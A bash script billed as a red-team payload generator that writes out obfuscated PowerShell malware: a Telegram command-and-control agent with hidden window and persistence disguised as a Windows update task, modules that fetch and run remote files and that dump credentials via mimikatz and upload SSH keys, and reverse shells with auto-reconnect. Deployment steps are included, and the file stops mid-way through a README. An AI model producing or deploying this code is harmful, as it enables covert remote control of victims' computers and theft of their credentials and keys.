#!/bin/bash
# File: pmtgener
# PMTgenerator V1.1 - Unified Payload Generator for Prometheus Loader

VERSION="1.1"
SCRIPT_NAME="pmtgener"
AUTHOR="Prometheus Loader Team"

# Default values
VERBOSE=0
PAYLOAD_TYPE=""
ENCRYPTION_LEVEL=5
LHOST=""
LPORT=""
TOKEN=""
ID=""
CHIMERA_SCRIPT="./chimera.sh"
CLOUD_MODULE=0
DUMPER_MODULE=0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to print colored messages
print_message() {
    local color=$1
    local message=$2
    echo -e "${color}[*] ${message}${NC}"
}

print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_info() {
    echo -e "${CYAN}[i] $1${NC}"
}

# Function to show banner
show_banner() {
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║               PMTgenerator V${VERSION}                      ║"
    echo "║     Prometheus Loader - Unified Payload Generator    ║"
    echo "╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Function to show help
show_help() {
    show_banner
    echo "Usage: $SCRIPT_NAME [OPTIONS]"
    echo ""
    echo "OPTIONS:"
    echo "  -h, --help           Show this help message and exit"
    echo "  -V, --version        Show version and exit"
    echo "  -v, --verbose        Enable verbosity during generation"
    echo ""
    echo "  -t, --type TYPE      Payload type (required)"
    echo "                       Available types:"
    echo "                         better_tg    - Advanced Telegram C2"
    echo "                         standart     - Standard Reverse Shell"
    echo "                         advanced     - Advanced Reverse Shell (persistence)"
    echo "                         tg_shell     - Basic Telegram Shell"
    echo ""
    echo "  -EL, --encrypt-level (0-5)  Encryption level for chimera"
    echo "                       0 = random, 1 = low, 2 = med, 3 = high,"
    echo "                       4 = higher, 5 = insane (default: 5)"
    echo ""
    echo "  --output FILE        Output filename (default: based on type)"
    echo ""
    echo "TELEGRAM SHELLS OPTIONS (for better_tg and tg_shell):"
    echo "  --token TOKEN        HTTP token for telegram bot"
    echo "  --id ID              Telegram user ID for bot access control"
    echo "  --cloud-module       Add cloud download module (Google Cloud, Dropbox, etc.)"
    echo "  --dumper-module      Add credential dumping module (NTML hash, SSH keys)"
    echo ""
    echo "REVERSE SHELLS OPTIONS (for standart and advanced):"
    echo "  --ip IP              Your local IP in wifi network"
    echo "  --port PORT          Port for shell to connect"
    echo ""
    echo "EXAMPLES:"
    echo "  $SCRIPT_NAME -t better_tg --token 123:ABC --id 456789 --cloud-module --dumper-module"
    echo "  $SCRIPT_NAME -t standart --ip 192.168.1.100 --port 4444"
    echo "  $SCRIPT_NAME -t advanced --ip 10.0.0.5 --port 9001 -EL 4 -v"
    echo ""
}

# Function to show version
show_version() {
    echo "PMTgenerator Version: $VERSION"
    echo "Part of Prometheus Loader - Red Team Deployment Kit"
    exit 0
}

# Cloud module PowerShell code
CLOUD_MODULE_CODE='function Cloud-Help {
    Send-TG -txt "Cloud module help:"
    Send-TG -txt "/cloud [download url]"
    Send-TG -txt "/cloud [download url] --exec"
    Send-TG -txt "/cloud [download url] --exec-admin-priv"
    Send-TG -txt "/cloud [download url] --exec-admin-priv [user] [password]"
    Send-TG -txt "/cloud [download url] --check-sha256-hash"
    Send-TG -txt "/cloud [download url] /absolute/path/to/save/file"
    Send-TG -txt "Working with Google Cloud, Dropbox, github, yandex disk, filebin"
}

function Download-File {
    param([string]$url, [string]$outputPath)
    try {
        if ($url -match "drive\.google\.com") {
            $fileId = $url -replace "^.*/d/([^/]+).*$", "`$1"
            $url = "https://drive.google.com/uc?export=download&id=$fileId"
        } elseif ($url -match "dropbox\.com") {
            $url = $url -replace "www\.dropbox\.com", "dl.dropboxusercontent.com"
        } elseif ($url -match "github\.com") {
            $url = $url -replace "github\.com", "raw.githubusercontent.com" -replace "/blob/", "/"
        } elseif ($url -match "disk\.yandex\.ru") {
            $url = $url -replace "/view/", "/public/get/"
        }
        
        Invoke-WebRequest -Uri $url -OutFile $outputPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        return $true
    } catch {
        Send-TG -txt "Download failed: $_"
        return $false
    }
}

function Process-Cloud-Command {
    param([string]$command)
    
    if ($command -eq "/cloud help") {
        Cloud-Help
        return
    }
    
    $pattern = "^/cloud\s+(https?://[^\s]+)(?:\s+(--exec|--exec-admin-priv|--check-sha256-hash|/[^\s]+))?(?:\s+(.*))?$"
    if ($command -match $pattern) {
        $url = $matches[1]
        $option = $matches[2]
        $extra = $matches[3]
        
        $tempFile = "$env:TEMP\" + [System.IO.Path]::GetRandomFileName()
        
        if (Download-File -url $url -outputPath $tempFile) {
            $fileSize = (Get-Item $tempFile).Length
            Send-TG -txt "File downloaded: $tempFile ($($fileSize) bytes)"
            
            switch ($option) {
                "--exec" {
                    try {
                        $result = powershell -ExecutionPolicy Bypass -File $tempFile 2>&1 | Out-String
                        Send-TG -txt "Execution result: $result"
                    } catch {
                        Send-TG -txt "Execution failed: $_"
                    }
                }
                "--exec-admin-priv" {
                    if ($extra) {
                        $credParts = $extra -split "\s+"
                        if ($credParts.Count -ge 2) {
                            $user = $credParts[0]
                            $password = $credParts[1]
                            $securePass = ConvertTo-SecureString $password -AsPlainText -Force
                            $cred = New-Object System.Management.Automation.PSCredential($user, $securePass)
                            
                            try {
                                Start-Process powershell.exe -Credential $cred -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`"" -NoNewWindow -Wait
                                Send-TG -txt "Executed with admin privileges"
                            } catch {
                                Send-TG -txt "Admin execution failed: $_"
                            }
                        }
                    } else {
                        try {
                            Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`"" -NoNewWindow -Wait
                            Send-TG -txt "Executed with elevated privileges (UAC prompt)"
                        } catch {
                            Send-TG -txt "Elevated execution failed: $_"
                        }
                    }
                }
                "--check-sha256-hash" {
                    $hash = Get-FileHash $tempFile -Algorithm SHA256
                    Send-TG -txt "SHA256 hash: $($hash.Hash)"
                }
                {$_ -match "^/" -and $_ -ne "--exec" -and $_ -ne "--exec-admin-priv" -and $_ -ne "--check-sha256-hash"} {
                    $targetPath = $option
                    try {
                        Copy-Item $tempFile $targetPath -Force
                        Send-TG -txt "File saved to: $targetPath"
                    } catch {
                        Send-TG -txt "Save failed: $_"
                    }
                }
                default {
                    Send-TG -txt "File downloaded successfully. Use --exec to execute or specify save path"
                }
            }
            
            # Cleanup
            Start-Sleep -Seconds 2
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
    } else {
        Send-TG -txt "Invalid cloud command format. Use: /cloud help"
    }
}'

# Dumper module PowerShell code
DUMPER_MODULE_CODE='function Dumper-Help {
    Send-TG -txt "Dumper module help:"
    Send-TG -txt "/dump NTML-hash (send ntml hash in message)"
    Send-TG -txt "/dump ssh-keys (send ssh-keys as document)"
}

function Send-File-Telegram {
    param([string]$filePath, [string]$caption)
    try {
        $curlCmd = "curl -X POST `"https://api.telegram.org/bot$token/sendDocument`" -F chat_id=$chatId -F document=@`"$filePath`""
        if ($caption) {
            $curlCmd += " -F caption=`"$caption`""
        }
        Invoke-Expression $curlCmd
        return $true
    } catch {
        Send-TG -txt "File upload failed: $_"
        return $false
    }
}

function Dump-NTML-Hash {
    try {
        # Try to get NTML hashes using various methods
        $hashes = @()
        
        # Method 1: Check SAM registry
        if (Test-Path "HKLM:\SAM\SAM\Domains\Account\Users") {
            Send-TG -txt "SAM registry access attempted"
        }
        
        # Method 2: Use mimikatz if available
        $mimikatzPaths = @("$env:TEMP\mimikatz.exe", "C:\Windows\System32\mimikatz.exe", "$env:USERPROFILE\Desktop\mimikatz.exe")
        foreach ($path in $mimikatzPaths) {
            if (Test-Path $path) {
                $result = & $path "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1
                $hashes += $result | Out-String
                break
            }
        }
        
        # Method 3: Basic system info
        if ($hashes.Count -eq 0) {
            $users = Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, Lockout, SID
            $systemInfo = "Users on system:`n" + ($users | Out-String)
            $hashes += $systemInfo
        }
        
        $tempFile = "$env:TEMP\ntml_hashes_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $hashes | Out-File $tempFile -Encoding UTF8
        Send-File-Telegram -filePath $tempFile -caption "NTML Hash Dump"
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-TG -txt "NTML dump failed: $_"
    }
}

function Dump-SSH-Keys {
    try {
        $sshFolders = @(
            "$env:USERPROFILE\.ssh",
            "C:\ProgramData\ssh",
            "$env:ALLUSERSPROFILE\ssh"
        )
        
        $foundKeys = @()
        foreach ($folder in $sshFolders) {
            if (Test-Path $folder) {
                $keys = Get-ChildItem $folder -File -Filter "*" -ErrorAction SilentlyContinue | 
                       Where-Object {$_.Name -match "(id_rsa|id_dsa|id_ecdsa|id_ed25519|authorized_keys|known_hosts)"}
                foreach ($key in $keys) {
                    $foundKeys += $key.FullName
                }
            }
        }
        
        if ($foundKeys.Count -gt 0) {
            $zipFile = "$env:TEMP\ssh_keys_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
            
            # Create ZIP archive
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($zipFile)
            
            foreach ($keyFile in $foundKeys) {
                $zipFolder.CopyHere($keyFile)
                Start-Sleep -Milliseconds 500
            }
            
            Start-Sleep -Seconds 2
            
            if (Test-Path $zipFile) {
                Send-File-Telegram -filePath $zipFile -caption "SSH Keys Dump ($($foundKeys.Count) files)"
                Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
            }
        } else {
            Send-TG -txt "No SSH keys found"
        }
        
    } catch {
        Send-TG -txt "SSH keys dump failed: $_"
    }
}

function Process-Dump-Command {
    param([string]$command)
    
    if ($command -eq "/dump help") {
        Dumper-Help
        return
    }
    
    switch -regex ($command) {
        "^/dump\s+NTML-hash$" {
            Dump-NTML-Hash
        }
        "^/dump\s+ssh-keys$" {
            Dump-SSH-Keys
        }
        default {
            Send-TG -txt "Invalid dump command. Use: /dump help"
        }
    }
}'

# Function to validate IP address
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to validate port
validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
        return 0
    else
        return 1
    fi
}

# Function to validate encryption level
validate_encryption_level() {
    local level=$1
    if [[ $level =~ ^[0-5]$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to detect local IP automatically
detect_local_ip() {
    local interfaces=("wlan0" "eth0" "en0" "enp0s3" "eth1")
    
    for iface in "${interfaces[@]}"; do
        if ip addr show "$iface" &>/dev/null; then
            LHOST=$(ip addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
            if [ -n "$LHOST" ]; then
                print_info "Detected local IP on $iface: $LHOST"
                return 0
            fi
        fi
    done
    
    # Try alternative methods
    LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [ -n "$LHOST" ]; then
        print_info "Detected local IP: $LHOST"
        return 0
    fi
    
    print_warning "Could not detect local IP automatically"
    return 1
}

# Function to check dependencies
check_dependencies() {
    local missing_deps=()
    
    # Check for required tools
    if [ ! -f "$CHIMERA_SCRIPT" ]; then
        print_error "Chimera script not found at: $CHIMERA_SCRIPT"
        print_info "Make sure chimera.sh is in the same directory or specify path"
        exit 1
    fi
    
    if ! command -v bash &>/dev/null; then
        missing_deps+=("bash")
    fi
    
    if ! command -v sed &>/dev/null; then
        missing_deps+=("sed")
    fi
    
    if ! command -v awk &>/dev/null; then
        missing_deps+=("awk")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        print_error "Missing dependencies: ${missing_deps[*]}"
        exit 1
    fi
    
    if [ $VERBOSE -eq 1 ]; then
        print_success "All dependencies met"
    fi
}

# Function to generate better_tg payload with modules
generate_better_tg() {
    local raw_file="raw_shell_tg_$$.ps1"
    local output_file="${OUTPUT_FILE:-"crypt_shell_tg_$$.ps1"}"
    
    if [ -z "$TOKEN" ] || [ -z "$ID" ]; then
        print_error "Token and ID are required for Telegram payloads"
        exit 1
    fi
    
    print_message "$CYAN" "Generating Advanced Telegram C2 payload..."
    if [ $CLOUD_MODULE -eq 1 ]; then
        print_info "Cloud module: ENABLED"
    fi
    if [ $DUMPER_MODULE -eq 1 ]; then
        print_info "Dumper module: ENABLED"
    fi
    
    # Create raw PowerShell file
    cat <<EOF > "$raw_file"
# 1. STEALTH
\$w = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name "W" -Namespace "U" -PassThru
\$w::ShowWindow(([DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow())::GetConsoleWindow(), 0)

# 2. PERSISTENCE
\$p = "\$env:APPDATA\Microsoft\Windows\tg_sys_check.ps1"
if (!(Test-Path \$p)) {
    Get-Content \$MyInvocation.MyCommand.Definition | Set-Content \$p
    \$act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File \"\$p\""
    \$trig = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action \$act -Trigger \$trig -TaskName "WindowsTGUpdate" -Force
}

# 3. CORE: Telegram C2 с Traceback
\$token='$TOKEN'
\$chatId='$ID'
\$offset=0

function Send-TG { param(\$txt)
    try {
        \$limit = 4000
        if(\$txt.Length -gt \$limit) { \$txt = \$txt.Substring(0, \$limit) + "... [Текст обрезан]" }
        \$body = @{ chat_id=\$chatId; text="[\$env:COMPUTERNAME] \$txt" }
        Invoke-RestMethod -Uri "https://api.telegram.org\$token/sendMessage" -Method Post -Body \$body
    } catch {}
}

$(if [ $CLOUD_MODULE -eq 1 ]; then echo "$CLOUD_MODULE_CODE"; fi)

$(if [ $DUMPER_MODULE -eq 1 ]; then echo "$DUMPER_MODULE_CODE"; fi)

while(\$true){
    try {
        \$url = "https://api.telegram.org\$token/getUpdates?timeout=20&offset=\$(\$offset + 1)"
        \$upd = Invoke-RestMethod -Uri \$url
        foreach(\$u in \$upd.result) {
            \$offset = \$u.update_id
            if(\$u.message.text) {
                \$c = \$u.message.text
                
                # Check for module commands first
                $(if [ $CLOUD_MODULE -eq 1 ]; then echo 'if ($c -match "^/cloud") {
                    Process-Cloud-Command -command $c
                    continue
                }'; fi)
                
                $(if [ $DUMPER_MODULE -eq 1 ]; then echo 'if ($c -match "^/dump") {
                    Process-Dump-Command -command $c
                    continue
                }'; fi)
                
                # Regular command execution
                try {
                    \$res = (Invoke-Expression \$c 2>&1 | Out-String)
                    if ([string]::IsNullOrWhiteSpace(\$res)) { \$res = "Success (No Output)" }
                    Send-TG -txt \$res
                } catch {
                    \$err = "CRITICAL ERROR:\r\nMessage: " + \$_.Exception.Message + 
                           "\r\nScriptStack: " + \$_.ScriptStackTrace + 
                           "\r\nCategory: " + \$_.CategoryInfo.ToString()
                    Send-TG -txt \$err
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds 1
}
EOF
    
    if [ $VERBOSE -eq 1 ]; then
        print_info "Created raw payload file: $raw_file"
    fi
    
    # Obfuscate with Chimera
    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
    
    if [ $VERBOSE -eq 1 ]; then
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
    else
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
    fi
    
    if [ $? -eq 0 ]; then
        print_success "Payload generated successfully: $output_file"
        print_info "Size: $(wc -c < "$output_file") bytes"
        
        if [ $CLOUD_MODULE -eq 1 ]; then
            print_info "Cloud module integrated: /cloud commands available"
        fi
        if [ $DUMPER_MODULE -eq 1 ]; then
            print_info "Dumper module integrated: /dump commands available"
        fi
        
        # Cleanup
        rm -f "$raw_file"
        if [ $VERBOSE -eq 1 ]; then
            print_info "Cleaned up temporary file: $raw_file"
        fi
        
        # Show usage instructions
        echo ""
        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
        print_info "1. Upload the payload to target system"
        print_info "2. Execute with: powershell -ExecutionPolicy Bypass -File $output_file"
        print_info "3. Send commands to your Telegram bot"
        print_info "4. Available module commands:"
        if [ $CLOUD_MODULE -eq 1 ]; then
            print_info "   - /cloud help - Show cloud module help"
            print_info "   - /cloud [url] - Download from cloud services"
        fi
        if [ $DUMPER_MODULE -eq 1 ]; then
            print_info "   - /dump help - Show dumper module help"
            print_info "   - /dump NTML-hash - Dump system hashes"
            print_info "   - /dump ssh-keys - Dump SSH keys"
        fi
    else
        print_error "Failed to obfuscate payload"
        exit 1
    fi
}

# Function to generate basic telegram shell with modules
generate_tg_shell() {
    local raw_file="raw_shell_basictg_$$.ps1"
    local output_file="${OUTPUT_FILE:-"crypt_shell_basictg_$$.ps1"}"
    
    if [ -z "$TOKEN" ] || [ -z "$ID" ]; then
        print_error "Token and ID are required for Telegram payloads"
        exit 1
    fi
    
    print_message "$CYAN" "Generating Basic Telegram Shell payload..."
    if [ $CLOUD_MODULE -eq 1 ]; then
        print_info "Cloud module: ENABLED"
    fi
    if [ $DUMPER_MODULE -eq 1 ]; then
        print_info "Dumper module: ENABLED"
    fi
    
    # Create raw PowerShell file
    cat <<EOF > "$raw_file"
\$token='$TOKEN'
\$chatId='$ID'
\$offset=0

function Send-TG { param(\$txt)
    try {
        \$body = @{ chat_id=\$chatId; text="\$txt" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/sendMessage" -Method Post -Body \$body
    } catch {}
}

$(if [ $CLOUD_MODULE -eq 1 ]; then echo "$CLOUD_MODULE_CODE"; fi)

$(if [ $DUMPER_MODULE -eq 1 ]; then echo "$DUMPER_MODULE_CODE"; fi)

while(\$true){
try{
\$updates=Invoke-RestMethod -Uri "https://api.telegram.org/bot\$token/getUpdates?timeout=5&offset=\$((\$offset + 1))"
foreach(\$update in \$updates.result){
\$offset=\$update.update_id
if(\$update.message.text){
\$msg=\$update.message.text

# Check for module commands
$(if [ $CLOUD_MODULE -eq 1 ]; then echo 'if ($msg -match "^/cloud") {
    Process-Cloud-Command -command $msg
    continue
}'; fi)

$(if [ $DUMPER_MODULE -eq 1 ]; then echo 'if ($msg -match "^/dump") {
    Process-Dump-Command -command $msg
    continue
}'; fi)

# Regular command execution
try{
\$result=Invoke-Expression \$msg 2>&1 | Out-String
Send-TG -txt "\$result"
}catch{
Send-TG -txt "Error: \$_"
}
}
}
}catch{}
Start-Sleep -Seconds 1
}
EOF
    
    if [ $VERBOSE -eq 1 ]; then
        print_info "Created raw payload file: $raw_file"
    fi
    
    # Obfuscate with Chimera
    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
    
    if [ $VERBOSE -eq 1 ]; then
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
    else
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
    fi
    
    if [ $? -eq 0 ]; then
        print_success "Payload generated successfully: $output_file"
        print_info "Size: $(wc -c < "$output_file") bytes"
        
        if [ $CLOUD_MODULE -eq 1 ]; then
            print_info "Cloud module integrated: /cloud commands available"
        fi
        if [ $DUMPER_MODULE -eq 1 ]; then
            print_info "Dumper module integrated: /dump commands available"
        fi
        
        # Cleanup
        rm -f "$raw_file"
        if [ $VERBOSE -eq 1 ]; then
            print_info "Cleaned up temporary file: $raw_file"
        fi
        
        # Show usage instructions
        echo ""
        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
        print_info "1. Simple Telegram C2 without advanced features"
        print_info "2. Send commands directly to your bot"
        print_info "3. Results will be sent back via Telegram"
        print_info "4. Module commands available:"
        if [ $CLOUD_MODULE -eq 1 ]; then
            print_info "   - /cloud help - Cloud download module"
        fi
        if [ $DUMPER_MODULE -eq 1 ]; then
            print_info "   - /dump help - Credential dumping module"
        fi
    else
        print_error "Failed to obfuscate payload"
        exit 1
    fi
}

# Function to generate standard reverse shell
generate_standart() {
    local raw_file="raw_shell_std_$$.ps1"
    local output_file="${OUTPUT_FILE:-"crypt_shell_std_$$.ps1"}"
    
    # Auto-detect LHOST if not provided
    if [ -z "$LHOST" ]; then
        if ! detect_local_ip; then
            print_error "Please specify IP address with --ip option"
            exit 1
        fi
    fi
    
    if [ -z "$LPORT" ]; then
        print_error "Please specify port with --port option"
        exit 1
    fi
    
    if ! validate_ip "$LHOST"; then
        print_error "Invalid IP address: $LHOST"
        exit 1
    fi
    
    if ! validate_port "$LPORT"; then
        print_error "Invalid port: $LPORT"
        exit 1
    fi
    
    print_message "$CYAN" "Generating Standard Reverse Shell payload..."
    print_info "LHOST: $LHOST, LPORT: $LPORT"
    
    # Create raw PowerShell file
    cat <<EOF > "$raw_file"
\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
EOF
    
    if [ $VERBOSE -eq 1 ]; then
        print_info "Created raw payload file: $raw_file"
    fi
    
    # Obfuscate with Chimera
    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
    
    if [ $VERBOSE -eq 1 ]; then
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
    else
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
    fi
    
    if [ $? -eq 0 ]; then
        print_success "Payload generated successfully: $output_file"
        print_info "Size: $(wc -c < "$output_file") bytes"
        
        # Cleanup
        rm -f "$raw_file"
        if [ $VERBOSE -eq 1 ]; then
            print_info "Cleaned up temporary file: $raw_file"
        fi
        
        # Show usage instructions
        echo ""
        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
        print_info "1. Start listener: nc -lvnp $LPORT"
        print_info "2. Upload and execute payload on target"
        print_info "3. Use stealth_loader.txt or main_loader.txt for delivery"
    else
        print_error "Failed to obfuscate payload"
        exit 1
    fi
}

# Function to generate advanced reverse shell
generate_advanced() {
    local raw_file="raw_shell_adv_$$.ps1"
    local output_file="${OUTPUT_FILE:-"crypt_shell_adv_$$.ps1"}"
    
    # Auto-detect LHOST if not provided
    if [ -z "$LHOST" ]; then
        if ! detect_local_ip; then
            print_error "Please specify IP address with --ip option"
            exit 1
        fi
    fi
    
    if [ -z "$LPORT" ]; then
        print_error "Please specify port with --port option"
        exit 1
    fi
    
    if ! validate_ip "$LHOST"; then
        print_error "Invalid IP address: $LHOST"
        exit 1
    fi
    
    if ! validate_port "$LPORT" ]; then
        print_error "Invalid port: $LPORT"
        exit 1
    fi
    
    print_message "$CYAN" "Generating Advanced Reverse Shell payload..."
    print_info "LHOST: $LHOST, LPORT: $LPORT"
    
    # Create raw PowerShell file
    cat <<EOF > "$raw_file"
# 1. STEALTH: Немедленно прячем окно
\$code = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
'@
\$type = Add-Type -MemberDefinition \$code -Name "Win32Utils" -Namespace "Util" -PassThru
\$type::ShowWindow(\$type::GetConsoleWindow(), 0)

# 2. PERSISTENCE: Самокопирование и создание задачи
\$path = "\$env:APPDATA\Microsoft\Windows\win_update.ps1"
if (! (Test-Path \$path)) {
    Get-Content \$MyInvocation.MyCommand.Definition | Set-Content \$path
    
    \$taskName = "WindowsUpdateAutoCheck"
    \$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File \"\$path\""
    \$trigger = New-ScheduledTaskTrigger -AtLogOn
    
    Register-ScheduledTask -Action \$action -Trigger \$trigger -TaskName \$taskName -Description "Microsoft Update" -Force
}

# 3. CORE: Рекурсивный Reverse Shell (авто-реконнект)
while(\$true) {
    try {
        \$c = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT)
        \$s = \$c.GetStream()
        \$b = New-Object Byte[] 65536
        
        while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0) {
            \$d = (New-Object Text.ASCIIEncoding).GetString(\$b, 0, \$i)
            \$out = (iex \$d 2>&1 | Out-String)
            \$p = "PS " + (pwd).Path + "> "
            \$res = ([Text.Encoding]::ASCII).GetBytes(\$out + \$p)
            \$s.Write(\$res, 0, \$res.Length)
        }
    } catch { 
        Start-Sleep -Seconds 30 
    }
}
EOF
    
    if [ $VERBOSE -eq 1 ]; then
        print_info "Created raw payload file: $raw_file"
    fi
    
    # Obfuscate with Chimera
    print_message "$CYAN" "Obfuscating with Chimera (Level: $ENCRYPTION_LEVEL)..."
    
    if [ $VERBOSE -eq 1 ]; then
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file"
    else
        bash "$CHIMERA_SCRIPT" --file "$raw_file" --all --level "$ENCRYPTION_LEVEL" --prepend --output "$output_file" --quiet
    fi
    
    if [ $? -eq 0 ]; then
        print_success "Payload generated successfully: $output_file"
        print_info "Size: $(wc -c < "$output_file") bytes"
        
        # Cleanup
        rm -f "$raw_file"
        if [ $VERBOSE -eq 1 ]; then
            print_info "Cleaned up temporary file: $raw_file"
        fi
        
        # Show usage instructions
        echo ""
        print_message "$YELLOW" "=== DEPLOYMENT INSTRUCTIONS ==="
        print_info "1. Start listener: nc -lvnp $LPORT"
        print_info "2. Payload includes persistence and stealth features"
        print_info "3. Will auto-reconnect every 30 seconds if connection drops"
    else
        print_error "Failed to obfuscate payload"
        exit 1
    fi
}

# Function to list available payload types
list_payload_types() {
    print_message "$BLUE" "Available Payload Types:"
    echo ""
    echo "  better_tg    - Advanced Telegram C2 with persistence and error handling"
    echo "  standart     - Standard PowerShell Reverse Shell"
    echo "  advanced     - Advanced Reverse Shell with stealth and persistence"
    echo "  tg_shell     - Basic Telegram command and control"
    echo ""
    exit 0
}

# Main script execution
main() {
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                exit 0
                ;;
            -V|--version)
                show_version
                ;;
            -v|--verbose)
                VERBOSE=1
                shift
                ;;
            -t|--type)
                PAYLOAD_TYPE="$2"
                if [[ ! "$PAYLOAD_TYPE" =~ ^(better_tg|standart|advanced|tg_shell)$ ]]; then
                    print_error "Invalid payload type: $PAYLOAD_TYPE"
                    list_payload_types
                fi
                shift 2
                ;;
            -EL|--encrypt-level)
                ENCRYPTION_LEVEL="$2"
                if ! validate_encryption_level "$ENCRYPTION_LEVEL"; then
                    print_error "Invalid encryption level: $ENCRYPTION_LEVEL (must be 0-5)"
                    exit 1
                fi
                shift 2
                ;;
            --output)
                OUTPUT_FILE="$2"
                shift 2
                ;;
            --ip)
                LHOST="$2"
                shift 2
                ;;
            --port)
                LPORT="$2"
                shift 2
                ;;
            --token)
                TOKEN="$2"
                shift 2
                ;;
            --id)
                ID="$2"
                shift 2
                ;;
            --cloud-module)
                CLOUD_MODULE=1
                shift
                ;;
            --dumper-module)
                DUMPER_MODULE=1
                shift
                ;;
            --list-types)
                list_payload_types
                ;;
            *)
                print_error "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done
    
    # Show banner
    if [ $VERBOSE -eq 1 ]; then
        show_banner
    fi
    
    # Check if payload type is specified
    if [ -z "$PAYLOAD_TYPE" ]; then
        print_error "Payload type is required. Use -t or --type"
        echo ""
        list_payload_types
        exit 1
    fi
    
    # Check if modules are used with Telegram payloads only
    if [ $CLOUD_MODULE -eq 1 ] || [ $DUMPER_MODULE -eq 1 ]; then
        if [[ ! "$PAYLOAD_TYPE" =~ ^(better_tg|tg_shell)$ ]]; then
            print_error "Cloud and Dumper modules are only available for Telegram payloads (better_tg, tg_shell)"
            exit 1
        fi
    fi
    
    # Check dependencies
    check_dependencies
    
    # Generate payload based on type
    case $PAYLOAD_TYPE in
        better_tg)
            generate_better_tg
            ;;
        standart)
            generate_standart
            ;;
        advanced)
            generate_advanced
            ;;
        tg_shell)
            generate_tg_shell
            ;;
        *)
            print_error "Unknown payload type: $PAYLOAD_TYPE"
            exit 1
            ;;
    esac
    
    # Show loader scripts info
    echo ""
    print_message "$YELLOW" "=== LOADER SCRIPTS ==="
    print_info "Use the following Ducky Scripts for delivery:"
    print_info "  stealth_loader.txt - Stealthy execution with cleanup"
    print_info "  main_loader.txt    - Fast execution method"
    print_info ""
    print_info "Replace 'ENTERURLHERE' with your payload URL in loader scripts"
}

# Create README file
create_readme() {
    cat <<EOF > README_PMTGENER.md
# PMTgenerator V1.1 - Prometheus Loader Payload Generator

## Overview
